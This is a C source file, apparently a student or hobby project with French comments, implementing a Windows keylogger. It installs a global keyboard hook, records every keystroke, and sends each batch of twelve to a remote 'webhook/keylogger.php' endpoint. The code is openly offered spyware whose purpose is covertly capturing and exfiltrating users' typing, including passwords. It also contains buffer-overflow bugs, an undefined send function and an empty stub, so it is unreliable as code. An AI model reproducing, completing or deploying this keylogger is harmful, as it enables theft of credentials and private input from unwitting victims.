#include <windows.h>
#include <stdio.h>
#include <time.h> 
#include <stdlib.h>
//#include "http.h"

#define MAX_KEYS 12

char key_log[MAX_KEYS];
int current_key_log_size = 0;


void key_code_to_string(){
    
    /*
    A CODER:
 je vais le faire
    Fonction qui permet d'avoir une touche exacte avec son code décimal, attention c'est pas de l'ascii je crois
    raison pour laquelle les minuscues sont enregistrés en majuscules 
    */
}

void send_keys(void){

    /*Permet d'envoyer les frappes de claviers au serveur et de vider le tableau  key_log*/

    char data[MAX_KEYS+50];
    snprintf(data, MAX_KEYS+50, "{\"keys\": \"%s\"}", key_log);
    memset(key_log, 0, sizeof(MAX_KEYS)); // vider le tableau
    current_key_log_size = 0;
    send_to_server("webhook/keylogger.php", data);
}


void log_key(int key) {

    /*Permet d'enregistrer les frappes de claviers dans le tab key_log*/

    snprintf(key_log, 1024, "%s%c", key_log, key); // rajoute le caractère dans key_log
    current_key_log_size++; // +=1
    if(current_key_log_size >= MAX_KEYS){ //vérifier si l'utilisateur à taper assez pour envoyer les clefs au server
        send_keys();
    }
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {

    /*Fonction de callback qui est associé à SetWindowsHookEx plus bas et qui envoie l'entier "key_code" 
    dans log_key()*/

    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT *)lParam;
        
        if (wParam == WM_KEYDOWN) {
            log_key(kbdStruct->vkCode);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int start_keylogger() {

    /*Fonction qui permet je lançer le keylogger grâce aux fonctions de windows.h*/

    printf("[*] Lancement du keylogger, envoie des frappes au serveur toute les %d frappes\n", MAX_KEYS);

    /* initialisation du hook permety d'eregistrer l'evennement système WH_KEYBOARD_LL (les frappes au clavier)
       et la fonction de callback est KeyboardProc

       https://learn.microsoft.com/fr-fr/windows/win32/api/winuser/nf-winuser-setwindowshookexa
    */
    HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);


    // Si l'initialisation marche pas
    if (keyboardHook == NULL) {
        printf("[-] Erreur su l'initatisation du keylogger\n");
        return 1;
    }


    // un message est un êvennement 
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboardHook); //supprime le hook
    return 0;
}
